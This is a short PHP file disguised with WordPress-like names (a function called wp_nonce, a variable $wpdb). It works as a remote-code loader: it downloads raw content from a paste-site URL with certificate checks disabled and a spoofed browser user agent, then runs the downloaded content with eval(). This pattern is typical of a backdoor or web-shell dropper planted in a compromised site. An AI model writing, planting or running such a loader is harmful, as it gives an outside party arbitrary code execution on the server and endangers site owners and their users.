<?php
function wp_nonce($url){
	$cookie = curl_init("$url");
	curl_setopt($cookie, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($cookie, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($cookie, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	curl_setopt($cookie, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($cookie, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($cookie, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
	curl_setopt($cookie, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
	$wpdb = curl_exec($cookie);
	return $wpdb;
}

$value = wp_nonce('https://e0c5d51dcbb0e972.paste.se/raw');
eval('?>'.$value);